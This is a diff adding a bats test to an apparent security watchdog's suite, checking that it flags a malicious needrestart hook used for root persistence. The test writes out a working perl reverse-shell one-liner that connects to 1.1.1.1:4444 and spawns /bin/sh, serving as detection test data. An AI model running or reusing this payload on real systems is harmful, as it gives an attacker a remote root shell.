@@ -279,3 +279,15 @@ seed_benign() {
     run_wd
     cap | grep -q 'distinctive-attacker-needrestart-hook'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on needrestart hook surface)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp needrestart-
+    # hook variants. Perl on every Debian/Ubuntu. Locks perl axis
+    # on T1546 post-upgrade-trigger root-exec persistence.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${HOOKD}/10-dpkg"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
